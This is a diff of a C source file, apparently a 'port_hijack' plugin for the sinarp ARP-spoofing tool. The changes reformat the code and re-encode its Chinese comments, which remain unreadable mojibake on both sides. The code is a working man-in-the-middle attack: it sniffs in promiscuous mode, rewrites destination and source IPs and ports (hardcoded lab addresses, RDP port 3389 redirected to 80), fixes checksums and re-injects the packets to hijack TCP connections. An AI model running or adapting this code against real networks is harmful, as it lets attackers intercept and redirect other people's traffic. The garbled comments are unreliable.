@@ -1,44 +1,42 @@
 /*
-¶Ë¿Ú½Ù³Ö 
-Èç¹ûÒ»·½ÆóÍ¼Á¬½Óµ½Ò»¸öÖ÷»úµÄÒ»¸ö¶Ë¿Ú »á±»½Ù³Ö ²¢×ª·¢µ½ÁíÍâÒ»¸öÖ÷»úµÄÁíÍâÒ»¸ö¶Ë¿Ú 
+ç«¯å£åŠ«æŒ
+å¦‚æœä¸€æ–¹ä¼å›¾è¿æ¥åˆ°ä¸€ä¸ªä¸»æœºçš„ä¸€ä¸ªç«¯å£ ä¼šè¢«åŠ«æŒ å¹¶è½¬å‘åˆ°å¦å¤–ä¸€ä¸ªä¸»æœºçš„å¦å¤–ä¸€ä¸ªç«¯å£
 
-  A -->M-->B
-  Ö»ĞèÒªµ¥ÏòÆÛÆ­¾ÍĞĞÁË¡£¡£
-  ÈÃA ÒÔÎª M ÊÇB
-  
-	³ÌĞò¾ÍÊÇ²»¹ØÈıÆß¶şÊ®Ò»Ö»Òª¶Ë¿Ú Ip ¶ÔÉÏÁË ¾Í×ª·¢¡£¡£
-	
-	  ÏÈÅĞ¶ÏÄ¿±êµÄ ip ºÍ ¶Ë¿Ú Èç¹û·ûºÏÒªÇó ¾Í¸ü¸ÄÆäÎª ÁíÍâÒ»¸ö ip ºÍ¶Ë¿Ú ²¢½« Õâ¸ö°ü·¢¸øÄÇ¸öÖ÷»ú 
-	  
-		Ã²ËÆÕâ¸öĞèÒªÎÒÃÇ²¶»ñµ½×Ô¼º·¢³öÈ¥µÄ°ü°¡¡­¡­
-		
-		  Èç¹ûÊÇÆäËûµÄµçÄÔ ÎÒÃÇÖ±½ÓÊ¹ÓÃ»Øµ÷º¯ÊıÀïÃæµÄ°ü ·ñÔò ÎÒÃÇ×Ô¼ºÆô¶¯Ò»¸öÏß³ÌÀ´²¶»ñ°ü
-		  
-			A - M - B
-			£ü
-			£Ã
-			
-			  ¹¤×÷Á÷³Ì£º
-			  ÏÈÊÇ A¡¡¸ø¡¡B·¢ËÍ¡¡ip¡¡°ü
-			  ÎÒÃÇ¶Ô±ÈÁË¡¡£é£ğ°üµÄ¶Ë¿ÚºÍipºó¡¡È·¶¨ĞèÒªÀ¹½ØÕâ¸ö°ü
-			  È»ºó½«°üµÄ¡¡Ä¿±ê¡¡ip¡¡¸Ä³É¡¡C¡¡µÄip¡¡²¢½«°ü·¢¸ø¡¡C¡¡£¨ÕâÀïÒª²»ÒªÀ¹½Ø¡¡C¡¡·¢µÄ°ü¡¡°Ñ¡¡Ô´µØÖ·¸ÄÎª¡¡BµÄ¡¡£é£ğ¡¡ÄØ£¿£¿£©
-			  È»ºó¡¡C¡¡»áºÍ¡¡A¡¡½¨Á¢Á¬½Ó¡¡
-			  Èç¹ûÒª°Ñ°ü·¢¸ø×Ô¼º
-			  
-				Æô¶¯¸öÏß³Ì¡¡À¹½Ø×Ô¼º·¢³öÈ¥µÄ°ü¡¡
-				½Ø»ñ¡¡A¡¡£­£­£¾¡¡£Â¡¡µÄ°üµÄÄ¿±ê¡¡£é£ğ¡¡¸ÄÎª×Ô¼ºµÄ¡¡È»ºó·¢¸ø×Ô¼º
-				È»ºó½Ø»ñ×Ô¼º·¢³öÈ¥µÄ°ü¡¡°ÑÔ´£é£ğ¸Ä³ÉBµÄipÔÙ·¢³öÈ¥¡¡¡¢¡¢
-				
-				  ÎÒÃÇ¿ÉÒÔ·¢°ü¸ø×Ô¼º È»ºó²Ù×÷ÏµÍ³ÓÖ´¦ÀíÂğ £¬£¬£¬¿ÉÒÔµÄ£¬£¬¡£
-				  
-					
-					  È«¾Ö±äÁ¿ ºÍ Ë½ÓĞº¯ÊıµÄÇ°×ºÎª ph
+A -- > M-- > B
+åªéœ€è¦å•å‘æ¬ºéª—å°±è¡Œäº†ã€‚ã€‚
+è®©A ä»¥ä¸º M æ˜¯B
 
-  ĞéÄâ»ú»·¾³²âÊÔ²»ÊÇºÜÎÈ¶¨ 
+ç¨‹åºå°±æ˜¯ä¸å…³ä¸‰ä¸ƒäºŒåä¸€åªè¦ç«¯å£ Ip å¯¹ä¸Šäº† å°±è½¬å‘ã€‚ã€‚
+
+å…ˆåˆ¤æ–­ç›®æ ‡çš„ ip å’Œ ç«¯å£ å¦‚æœç¬¦åˆè¦æ±‚ å°±æ›´æ”¹å…¶ä¸º å¦å¤–ä¸€ä¸ª ip å’Œç«¯å£ å¹¶å°† è¿™ä¸ªåŒ…å‘ç»™é‚£ä¸ªä¸»æœº
+
+è²Œä¼¼è¿™ä¸ªéœ€è¦æˆ‘ä»¬æ•è·åˆ°è‡ªå·±å‘å‡ºå»çš„åŒ…å•Šâ€¦â€¦
+
+å¦‚æœæ˜¯å…¶ä»–çš„ç”µè„‘ æˆ‘ä»¬ç›´æ¥ä½¿ç”¨å›è°ƒå‡½æ•°é‡Œé¢çš„åŒ… å¦åˆ™ æˆ‘ä»¬è‡ªå·±å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥æ•è·åŒ…
+
+A - M - B
+ï½œ
+ï¼£
+
+å·¥ä½œæµç¨‹ï¼š
+å…ˆæ˜¯ Aã€€ç»™ã€€Bå‘é€ã€€ipã€€åŒ…
+æˆ‘ä»¬å¯¹æ¯”äº†ã€€ï½‰ï½åŒ…çš„ç«¯å£å’Œipåã€€ç¡®å®šéœ€è¦æ‹¦æˆªè¿™ä¸ªåŒ…
+ç„¶åå°†åŒ…çš„ã€€ç›®æ ‡ã€€ipã€€æ”¹æˆã€€Cã€€çš„ipã€€å¹¶å°†åŒ…å‘ç»™ã€€Cã€€ï¼ˆè¿™é‡Œè¦ä¸è¦æ‹¦æˆªã€€Cã€€å‘çš„åŒ…ã€€æŠŠã€€æºåœ°å€æ”¹ä¸ºã€€Bçš„ã€€ï½‰ï½ã€€å‘¢ï¼Ÿï¼Ÿï¼‰
+ç„¶åã€€Cã€€ä¼šå’Œã€€Aã€€å»ºç«‹è¿æ¥ã€€
+å¦‚æœè¦æŠŠåŒ…å‘ç»™è‡ªå·±
+
+å¯åŠ¨ä¸ªçº¿ç¨‹ã€€æ‹¦æˆªè‡ªå·±å‘å‡ºå»çš„åŒ…ã€€
+æˆªè·ã€€Aã€€ï¼ï¼ï¼ã€€ï¼¢ã€€çš„åŒ…çš„ç›®æ ‡ã€€ï½‰ï½ã€€æ”¹ä¸ºè‡ªå·±çš„ã€€ç„¶åå‘ç»™è‡ªå·±
+ç„¶åæˆªè·è‡ªå·±å‘å‡ºå»çš„åŒ…ã€€æŠŠæºï½‰ï½æ”¹æˆBçš„ipå†å‘å‡ºå»ã€€ã€ã€
+
+æˆ‘ä»¬å¯ä»¥å‘åŒ…ç»™è‡ªå·± ç„¶åæ“ä½œç³»ç»Ÿåˆå¤„ç†å— ï¼Œï¼Œï¼Œå¯ä»¥çš„ï¼Œï¼Œã€‚
 
 
-					  
+å…¨å±€å˜é‡ å’Œ ç§æœ‰å‡½æ•°çš„å‰ç¼€ä¸º ph
+
+è™šæ‹Ÿæœºç¯å¢ƒæµ‹è¯•ä¸æ˜¯å¾ˆç¨³å®š
 */
+
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -47,167 +45,167 @@
 #ifdef WIN32
 #include <windows.h>
 #endif
-#include <sinarp.h>
+#include "../../sinarp.h"
 
 uint32 ph_hjack_ip = 0;//inet_addr("192.168.244.131");
 uint32 ph_spoof_ip = 0;
-uint16 ph_hjack_port = 0;  //×¢Òâ¶Ë¿ÚÒª×ª³ÉÍøÂç×Ö½ÚĞòµÄ 
+uint16 ph_hjack_port = 0;  //æ³¨æ„ç«¯å£è¦è½¬æˆç½‘ç»œå­—èŠ‚åºçš„
 uint16 ph_spoof_port = 0;
-uint16 ph_black_ip = 0;//Ò»¸ö²»ÊÇ»î¶¯µÄ ip 
-uint32 ph_remote_ip = 0 ;//ÓÃÀ´ÔÚÊ¹ÓÃ±¾»úµÄÊ±ºò ¼Ç×¡Ô¶´¦µÄ ip 
-BOOL ph_is_need_self_capture = FALSE;//ÊÇ²»ÊÇĞèÒª×Ô¼ºÀ´²¶»ñÊı¾İ°ü ´ËÊ±ĞèÒª×Ô¼º´ò¿ªÍø¿¨ »ñµÃÒ»¸öĞÂµÄ¾ä±ú
+uint16 ph_black_ip = 0;//ä¸€ä¸ªä¸æ˜¯æ´»åŠ¨çš„ ip
+uint32 ph_remote_ip = 0 ;//ç”¨æ¥åœ¨ä½¿ç”¨æœ¬æœºçš„æ—¶å€™ è®°ä½è¿œå¤„çš„ ip
+BOOL ph_is_need_self_capture = FALSE;//æ˜¯ä¸æ˜¯éœ€è¦è‡ªå·±æ¥æ•è·æ•°æ®åŒ… æ­¤æ—¶éœ€è¦è‡ªå·±æ‰“å¼€ç½‘å¡ è·å¾—ä¸€ä¸ªæ–°çš„å¥æŸ„
 pcap_t *ph_pcap_handle = NULL;
 
 /*
-process_packet ÀïÃæ½ÓÊÕ²»µ½ ÏµÍ³×Ô¼º·¢³öÈ¥µÄ°ü ±»ÉèÖÃµÄ¹ıÂËÆ÷¹ıÂËÁË¡£
+process_packet é‡Œé¢æ¥æ”¶ä¸åˆ° ç³»ç»Ÿè‡ªå·±å‘å‡ºå»çš„åŒ… è¢«è®¾ç½®çš„è¿‡æ»¤å™¨è¿‡æ»¤äº†ã€‚
 */
 
-BOOL  process_packet(ETHeader *ethdr,uint32 len) // ´¦ÀíÊÕµ½µÄ ip °ü
+BOOL  process_packet(ETHeader *ethdr, uint32 len) // å¤„ç†æ”¶åˆ°çš„ ip åŒ…
 {
-	IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
-	uint32 ip_len,data_len;
-	uint8 *data_offset;
-	uint32 pro_len;
-	uint16 sport,dport;
-	TCPHeader *tcphdr;
-	UDPHEADER *udphdr;
-	ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
-	if(iphdr->ipProtocol == PROTO_TCP)
-	{
-		// ÕÒµ½TCPµÄÎ»ÖÃ
-		tcphdr = (TCPHeader *) ((u_char*)iphdr + ip_len);
-		pro_len = ((tcphdr->dataoffset>>4)*sizeof(unsigned long));
-		sport = ntohs(tcphdr->sourcePort);
-		dport = ntohs(tcphdr->destinationPort );
-		
-		//printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
-	}
-	else if(iphdr->ipProtocol == PROTO_UDP)
-	{
-		// ÕÒµ½UDPµÄÎ»ÖÃ
-		//ÎÒÃÇ²»¹ØĞÄ UDP 
-		return TRUE;//½»¸øÉÏ²ã×ª·¢
+    IPHeader *iphdr = (IPHeader *)(((uint8 *)ethdr) + 14);
+    uint32 ip_len, data_len;
+    uint8 *data_offset;
+    uint32 pro_len;
+    uint16 sport, dport;
+    TCPHeader *tcphdr;
+    UDPHEADER *udphdr;
+    ip_len = (iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
+    if (iphdr->ipProtocol == PROTO_TCP)
+    {
+        // æ‰¾åˆ°TCPçš„ä½ç½®
+        tcphdr = (TCPHeader *) ((u_char *)iphdr + ip_len);
+        pro_len = ((tcphdr->dataoffset >> 4) * sizeof(unsigned long));
+        sport = ntohs(tcphdr->sourcePort);
+        dport = ntohs(tcphdr->destinationPort );
 
-		udphdr = (UDPHEADER *) ((u_char*)iphdr + ip_len);
-		pro_len = ntohs(udphdr->uh_len);
-		sport = ntohs(udphdr->uh_sport);
-		dport = ntohs(udphdr->uh_dport);
-	}
-	else 
-	{
-		//²»ÈÏÊ¶µÄ¶«¶«  ICMP etc.
-		return TRUE;
-	}
-	// Êı¾İ³¤¶È
-	data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
-	// Ö¸ÏòÊı¾İµÄÖ¸Õë
-	data_offset = (unsigned char *)iphdr + ip_len + pro_len;
+        //printf("%s \n",(unsigned char *)iphdr + ip_len + pro_len);
+    }
+    else if (iphdr->ipProtocol == PROTO_UDP)
+    {
+        // æ‰¾åˆ°UDPçš„ä½ç½®
+        //æˆ‘ä»¬ä¸å…³å¿ƒ UDP
+        return TRUE;//äº¤ç»™ä¸Šå±‚è½¬å‘
 
-	//sinarp_printf("%s\n","xxxx");
+        udphdr = (UDPHEADER *) ((u_char *)iphdr + ip_len);
+        pro_len = ntohs(udphdr->uh_len);
+        sport = ntohs(udphdr->uh_sport);
+        dport = ntohs(udphdr->uh_dport);
+    }
+    else
+    {
+        //ä¸è®¤è¯†çš„ä¸œä¸œ  ICMP etc.
+        return TRUE;
+    }
+    // æ•°æ®é•¿åº¦
+    data_len = ntohs(iphdr->ipLength) - (ip_len + pro_len);
+    // æŒ‡å‘æ•°æ®çš„æŒ‡é’ˆ
+    data_offset = (unsigned char *)iphdr + ip_len + pro_len;
 
-	if(iphdr->ipDestination == ph_hjack_ip)
-	{
-		//ÕâÊÇ¸ö·¢Ïò ÒªÆÛÆ­Ä¿±êµÄÊı¾İ°ü  ÏÂÃæ¿´¿´¶Ë¿ÚÊÇ²»ÊÇÒª½Ù³ÖµÄ¶Ë¿Ú¡¢
-		if(tcphdr->destinationPort == ph_hjack_port)
-		{
-			//ÎÒÃÇĞèÒªĞŞ¸ÄÊı¾İ°ü ½«Ä¿±ê ip ºÍ ¶Ë¿Ú ĞŞ¸Ä³É spoof ip µÄ¶Ë¿ÚºÍ ip 
-			sinarp_printf("\r%s\n","hijack ----> spoof  !!!");
-			iphdr->ipDestination = ph_spoof_ip;
-			tcphdr->destinationPort = ph_spoof_port;
-			
-			if(iphdr->ipDestination == g_my_ip)
-			{
-				sinarp_printf("send packet to me ..\n");
-				memcpy(ethdr->shost,g_my_mac,6);
-				memcpy(ethdr->dhost,g_my_gw_mac,6); //·¢ËÍ¸øÍø¹Ø È»ºóÔÙ·´Éä»ØÀ´¡£¡£¡£
-				iphdr->ipSource = ph_black_ip; //ÉèÎªÎŞĞ§µÄ ip 
-				sinarp_checksum(iphdr);
-				//·¢¸øÎÒÃÇ×Ô¼º 
-				if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
-				{
-					printf("\r[!] port_hijack: send packet failed !\r\n");
-				}
-				return FALSE;
-			}
-			sinarp_checksum(iphdr);
-		}
-	}
-	else if(iphdr->ipSource == ph_spoof_ip)
-	{
-		if(tcphdr->sourcePort == ph_spoof_port)
-		{
-			//ÎÒÃÇĞèÒªĞŞ¸ÄÔ´ ip ºÍ ¶Ë¿ÚÎª hijack µÄ ip ºÍ ¶Ë
+    //sinarp_printf("%s\n","xxxx");
 
-			if(iphdr->ipSource == g_my_ip)
-			{
-				sinarp_printf("\r%s\n","spoof ----> hijack  !!!");
-				iphdr->ipSource = ph_hjack_ip;
-				tcphdr->sourcePort = ph_hjack_port;
+    if (iphdr->ipDestination == ph_hjack_ip)
+    {
+        //è¿™æ˜¯ä¸ªå‘å‘ è¦æ¬ºéª—ç›®æ ‡çš„æ•°æ®åŒ…  ä¸‹é¢çœ‹çœ‹ç«¯å£æ˜¯ä¸æ˜¯è¦åŠ«æŒçš„ç«¯å£ã€
+        if (tcphdr->destinationPort == ph_hjack_port)
+        {
+            //æˆ‘ä»¬éœ€è¦ä¿®æ”¹æ•°æ®åŒ… å°†ç›®æ ‡ ip å’Œ ç«¯å£ ä¿®æ”¹æˆ spoof ip çš„ç«¯å£å’Œ ip
+            sinarp_printf("\r%s\n", "hijack ----> spoof  !!!");
+            iphdr->ipDestination = ph_spoof_ip;
+            tcphdr->destinationPort = ph_spoof_port;
 
-				sinarp_checksum(iphdr);
-				sinarp_forward_fix_packet(ethdr);
-				if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
-				{
-					printf("\r[!] port_hijack: send packet failed !\r\n");
-				}
-				return FALSE;
-			}
+            if (iphdr->ipDestination == g_my_ip)
+            {
+                sinarp_printf("send packet to me ..\n");
+                memcpy(ethdr->shost, g_my_mac, 6);
+                memcpy(ethdr->dhost, g_my_gw_mac, 6); //å‘é€ç»™ç½‘å…³ ç„¶åå†åå°„å›æ¥ã€‚ã€‚ã€‚
+                iphdr->ipSource = ph_black_ip; //è®¾ä¸ºæ— æ•ˆçš„ ip
+                sinarp_checksum(iphdr);
+                //å‘ç»™æˆ‘ä»¬è‡ªå·±
+                if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
+                {
+                    printf("\r[!] port_hijack: send packet failed !\r\n");
+                }
+                return FALSE;
+            }
+            sinarp_checksum(iphdr);
+        }
+    }
+    else if (iphdr->ipSource == ph_spoof_ip)
+    {
+        if (tcphdr->sourcePort == ph_spoof_port)
+        {
+            //æˆ‘ä»¬éœ€è¦ä¿®æ”¹æº ip å’Œ ç«¯å£ä¸º hijack çš„ ip å’Œ ç«¯
 
-			sinarp_printf("\r%s\n","spoof ----> hijack  !!!");
-			iphdr->ipSource = ph_hjack_ip;
-			tcphdr->sourcePort = ph_hjack_port;
-			sinarp_checksum(iphdr);
-		}
-	}
-/*	else if(iphdr->ipSource == ph_hjack_ip)
-	{
-		if (tcphdr->sourcePort == ph_hjack_port)
-		{
-			sinarp_printf("%s","\rtry block ...\n");
-			return FALSE;// ÆÁ±ÎÕâÑùµÄ°ü¡£¡£
-		}
-	}
-	*/
-	return TRUE;
+            if (iphdr->ipSource == g_my_ip)
+            {
+                sinarp_printf("\r%s\n", "spoof ----> hijack  !!!");
+                iphdr->ipSource = ph_hjack_ip;
+                tcphdr->sourcePort = ph_hjack_port;
+
+                sinarp_checksum(iphdr);
+                sinarp_forward_fix_packet(ethdr);
+                if (pf_pcap_sendpacket(ph_pcap_handle, (uint8 *)ethdr, len) < 0)
+                {
+                    printf("\r[!] port_hijack: send packet failed !\r\n");
+                }
+                return FALSE;
+            }
+
+            sinarp_printf("\r%s\n", "spoof ----> hijack  !!!");
+            iphdr->ipSource = ph_hjack_ip;
+            tcphdr->sourcePort = ph_hjack_port;
+            sinarp_checksum(iphdr);
+        }
+    }
+    /*  else if(iphdr->ipSource == ph_hjack_ip)
+        {
+            if (tcphdr->sourcePort == ph_hjack_port)
+            {
+                sinarp_printf("%s","\rtry block ...\n");
+                return FALSE;// å±è”½è¿™æ ·çš„åŒ…ã€‚ã€‚
+            }
+        }
+        */
+    return TRUE;
 }
 
 
-void   ph_packet_handler(u_char *param, const struct pcap_pkthdr *header, 
-						 const u_char *pkt_data)
+void   ph_packet_handler(u_char *param, const struct pcap_pkthdr *header,
+                         const u_char *pkt_data)
 {
     ETHeader *eh;
     IPHeader *ih;
     ARPHeader *arp_hdr;
     BOOL bRet = FALSE;
-    u_int ip_len=0, pro_len=0, data_len=0;
+    u_int ip_len = 0, pro_len = 0, data_len = 0;
     u_int pkt_len = header->len;
     uint32 idx = 0;
     eh = (ETHeader *) pkt_data;
-    if(pkt_len < 14)
-        return; 
-	
-	//×ª·¢ ip Êı¾İ°ü¡£¡£
-	if(eh->type != htons(ETHERTYPE_IP))
-		return; // Ö»×ª·¢IP°ü
-	
-	// ÕÒµ½IPÍ·µÄÎ»ÖÃºÍµÃµ½IPÍ·µÄ³¤¶È
-	ih = (IPHeader *) ((u_char*)eh + 14); //14ÎªÒÔÌ«Í·µÄ³¤¶È
-	
-	sinarp_printf("\rrecv one \n");
-	process_packet(eh,pkt_len);
+    if (pkt_len < 14)
+        return;
 
-	return;
+    //è½¬å‘ ip æ•°æ®åŒ…ã€‚ã€‚
+    if (eh->type != htons(ETHERTYPE_IP))
+        return; // åªè½¬å‘IPåŒ…
+
+    // æ‰¾åˆ°IPå¤´çš„ä½ç½®å’Œå¾—åˆ°IPå¤´çš„é•¿åº¦
+    ih = (IPHeader *) ((u_char *)eh + 14); //14ä¸ºä»¥å¤ªå¤´çš„é•¿åº¦
+
+    sinarp_printf("\rrecv one \n");
+    process_packet(eh, pkt_len);
+
+    return;
 }
 
 
-void * ph_capture(void *x)
+void *ph_capture(void *x)
 {
     int ret;
 
-    while(!g_is_time_shutdown)//ºÍ sinarp ¹²Ïí±äÁ¿
+    while (!g_is_time_shutdown) //å’Œ sinarp å…±äº«å˜é‡
     {
-        ret = pf_pcap_loop(ph_pcap_handle, 1, (pcap_handler)ph_packet_handler,NULL);
-        if(ret == 0)
+        ret = pf_pcap_loop(ph_pcap_handle, 1, (pcap_handler)ph_packet_handler, NULL);
+        if (ret == 0)
         {
             continue;
         }
@@ -221,71 +219,71 @@ void * ph_capture(void *x)
 
 BOOL plugin_init()
 {
-	char errbuf[PCAP_ERRBUF_SIZE];
-	char sniffer_filter[256];
-	struct bpf_program fcode;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char sniffer_filter[256];
+    struct bpf_program fcode;
 
-	ph_hjack_ip = inet_addr("192.168.244.122");
-	ph_spoof_ip = inet_addr("192.168.244.128");
-	ph_black_ip = inet_addr("192.168.244.244");
-	ph_hjack_port = htons(3389);
-	ph_spoof_port = htons(80);
+    ph_hjack_ip = inet_addr("192.168.244.122");
+    ph_spoof_ip = inet_addr("192.168.244.128");
+    ph_black_ip = inet_addr("192.168.244.244");
+    ph_hjack_port = htons(3389);
+    ph_spoof_port = htons(80);
 
-	if(ph_spoof_ip == g_my_ip)
-	{
-		ph_is_need_self_capture = TRUE;
-		if((ph_pcap_handle = pf_pcap_open_live(g_opened_if_name, // device 
-			65536,     // portion of the packet to capture.
-			// 65536 grants that the whole packet will be captured on all the MACs.
-			1,       // promiscuous mode 
-			1, //a value of 0 means no time out
-			errbuf     // error buffer
-			)) == NULL)
-		{
-			sinarp_printf("failed open %s \n",g_opened_if_name);
-			return FALSE;
+    if (ph_spoof_ip == g_my_ip)
+    {
+        ph_is_need_self_capture = TRUE;
+        if ((ph_pcap_handle = pf_pcap_open_live(g_opened_if_name, // device
+                                                65536,     // portion of the packet to capture.
+                                                // 65536 grants that the whole packet will be captured on all the MACs.
+                                                1,       // promiscuous mode
+                                                1, //a value of 0 means no time out
+                                                errbuf     // error buffer
+                                               )) == NULL)
+        {
+            sinarp_printf("failed open %s \n", g_opened_if_name);
+            return FALSE;
         }
-		
-		//Ö»²¶»ñÎÒÃÇ×Ô¼º·¢³öÈ¥µÄ°ü
-		sprintf(sniffer_filter,"tcp src port %u",htons(ph_spoof_port));
 
-		sinarp_printf("filter: %s \n",sniffer_filter);
+        //åªæ•è·æˆ‘ä»¬è‡ªå·±å‘å‡ºå»çš„åŒ…
+        sprintf(sniffer_filter, "tcp src port %u", htons(ph_spoof_port));
 
-		if (pf_pcap_compile(ph_pcap_handle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
-		{
-			sinarp_printf("%s","\nUnable to compile the packet filter\n");
-			/* Free the device list */
-			goto clean;
-		}
-		//ÉèÖÃ¹ıÂËÆ÷
-		if (pf_pcap_setfilter(ph_pcap_handle, &fcode) < 0)
-		{
-			sinarp_printf("%s","\nError setting the filter.\n");
-			/* Free the device list */
-			goto clean;
-		}
-		sinarp_printf("\rport_hijack start capture thread \n");
-		sinarp_create_thread(ph_capture,NULL);
+        sinarp_printf("filter: %s \n", sniffer_filter);
+
+        if (pf_pcap_compile(ph_pcap_handle, &fcode, sniffer_filter, 1, g_my_netmask) < 0)
+        {
+            sinarp_printf("%s", "\nUnable to compile the packet filter\n");
+            /* Free the device list */
+            goto clean;
+        }
+        //è®¾ç½®è¿‡æ»¤å™¨
+        if (pf_pcap_setfilter(ph_pcap_handle, &fcode) < 0)
+        {
+            sinarp_printf("%s", "\nError setting the filter.\n");
+            /* Free the device list */
+            goto clean;
+        }
+        sinarp_printf("\rport_hijack start capture thread \n");
+        sinarp_create_thread(ph_capture, NULL);
     }
-	else
-	{
-		ph_is_need_self_capture = FALSE;
-	}
+    else
+    {
+        ph_is_need_self_capture = FALSE;
+    }
 
-	return TRUE;
+    return TRUE;
 clean:
-	pf_pcap_close(ph_pcap_handle);
-	return FALSE;
+    pf_pcap_close(ph_pcap_handle);
+    return FALSE;
 }
 
-void * plugin_unload()
+void *plugin_unload()
 {
-	if(ph_is_need_self_capture)
-	{
-		pf_pcap_breakloop(ph_pcap_handle);
-		//Sleep(1000);
-		pf_pcap_close(ph_pcap_handle);
-	}
+    if (ph_is_need_self_capture)
+    {
+        pf_pcap_breakloop(ph_pcap_handle);
+        //Sleep(1000);
+        pf_pcap_close(ph_pcap_handle);
+    }
 }
 
 /*
@@ -296,16 +294,16 @@ switch(dwReason)
 case DLL_PROCESS_ATTACH:
 {
 
-		}
-		break;
-		case DLL_PROCESS_DETACH:
-		{
-		
-		  }
-		  break;
-		  default:
-		  break;
-		  }
-		  return TRUE;
-		  }
+        }
+        break;
+        case DLL_PROCESS_DETACH:
+        {
+
+          }
+          break;
+          default:
+          break;
+          }
+          return TRUE;
+          }
 */
